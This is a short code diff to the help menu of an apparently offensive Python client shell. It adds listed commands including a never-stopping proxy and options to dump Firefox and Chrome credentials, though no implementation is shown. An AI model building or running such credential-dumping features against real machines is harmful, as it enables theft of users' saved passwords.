@@ -156,7 +156,13 @@ class Client:
 			    print ""
 			    break
 			if user_input == "help":
-				print "Available commands:\n prompt - change prompt"
+				print "Available commands:"
+				print " - prompt - Modify the prompt aesthetics,"
+				print " - crash - Crash the shell like Ayrton Senna,"
+				print " - test - Test the connection like a baws,"
+                                print " - proxy - Start the always running proxy WARNING: Does not stop! Ever!"
+                                print " - dumpff - Dump Firefox Credientials,"
+                                print " - dumpchrome - Dump Chrome Credientials."
 			else:
 				try:
 					if not user_input: continue
